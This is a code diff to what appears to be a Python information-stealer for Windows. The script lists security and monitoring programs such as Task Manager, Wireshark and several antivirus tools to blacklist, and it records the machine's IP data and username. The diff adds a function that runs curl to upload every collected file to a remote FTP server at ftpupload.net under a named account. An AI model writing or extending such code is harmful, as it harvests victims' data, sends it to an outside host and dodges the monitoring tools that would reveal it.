@@ -7,7 +7,7 @@ import socket
 import time
 import psutil
 from dotenv import load_dotenv
-global API_KEY
+global API_KEY,USERNAME,PASSWORD,name
 
 
 blackListedPrograms = ["Taskmgr.exe","NortonSecurity.exe","Wireshark.exe","bdagent.exe","mcagent.exe","mbam.exe","Mbamservice.exe","wsc_proxy.exe"]
@@ -16,19 +16,20 @@ blackListedPrograms = ["Taskmgr.exe","NortonSecurity.exe","Wireshark.exe","bdage
 if platform.system() == "Windows":
 
     load_dotenv()
-    API_KEY = os.getenv("TOKEN")
+    API_KEY,USERNAME,PASSWORD = os.getenv("TOKEN"),os.getenv("FTP_USERNAME"),os.getenv("FTP_PASSWORD")
 
     value = dict(os.environ)
     userprofile = value["USERPROFILE"]
-    username = value["COMPUTERNAME"]
+    computer_user = value["COMPUTERNAME"]
     home = value["HOMEDRIVE"]+value["HOMEPATH"]
+    name = str(psutil.users()[0][0])
 
     while True:
         try:
             os.chdir(home+"\\Desktop\\Test")
             file = open("IPInfo.txt", "w")
             file.write(str(time.asctime(time.localtime(time.time())))+"\n")
-            file.write(psutil.users()[0][0])
+            file.write(name)
             file.write(" Data\n")
             file.close()
             break
@@ -119,11 +120,19 @@ if platform.system() == "Windows":
             except FileNotFoundError:
                 os.mkdir(home+"\\Desktop\\Test")
                 continue
+
+    def upload_ftp():
+        os.chdir(home+"\\Desktop\\Test")
+        lst = os.listdir()
+        print(lst)
+        for i in range(len(lst)):
+            os.system(f"curl -v -u {USERNAME}:{PASSWORD} -T {home}\\Desktop\\Test\\{lst[i]} ftp://epiz_32211127@ftpupload.net/htdocs/IPUPLOAD/")
     
     test()
     #fileloc()
     ipinfo(ipreq(ipgrabber()))
     otherinfo()
+    upload_ftp()
     #currunproc()
 
 else:
